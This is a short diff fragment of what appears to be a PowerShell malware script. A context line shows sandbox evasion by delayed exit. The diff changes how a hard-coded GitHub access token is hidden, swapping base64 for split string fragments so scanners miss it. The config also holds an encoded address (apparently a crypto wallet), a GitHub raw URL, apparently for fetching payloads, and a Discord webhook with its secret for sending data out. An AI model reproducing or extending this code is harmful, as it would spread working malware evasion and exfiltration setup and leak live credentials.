@@ -41,7 +41,8 @@ if (Test-Sandbox) { Start-Sleep -Seconds (Get-Random -Minimum 10 -Maximum 30); r
 # === CONFIG (fragmented) ===
 $c = @{}
 $c.u1 = 'HolyV200'; $c.u2 = 'test-repo'
-$c.pat = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Z2hwX0cyVTI1b1ZheTNjalMzVVBTRzdVVldnVGFkcDk1MTBXV0ZMRA=='))
+$p1 = 'ghp_G2U25oVay3'; $p2 = 'cjS3UPSG7UVWgTadp9510WWFLD'
+$c.pat = $p1 + $p2
 $c.addr = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('NDQ4M0cxQWdTMXBkc0xxenQzbkZRbUw4SFBGM0MyV1ZyTE1SQWRBVkdxeHo2aXBWM2FGOG5vN2NtRGtINHdNWno5WUQ1cU5VWjk2bkdMTUtwZHQ1clhacU13R2ZMYzM='))
 $c.base = "https://raw.githubusercontent.com/$($c.u1)/$($c.u2)/main"
 $c.wh = "https://discord.com/api/webhooks/1502316875638636624/qpXdrqNC3xCsJlIYR96XNGqEBUXNoDLr_LZmRAwrrsUDHh8oHsLRX1Mo_s4UE9m7IHY1"
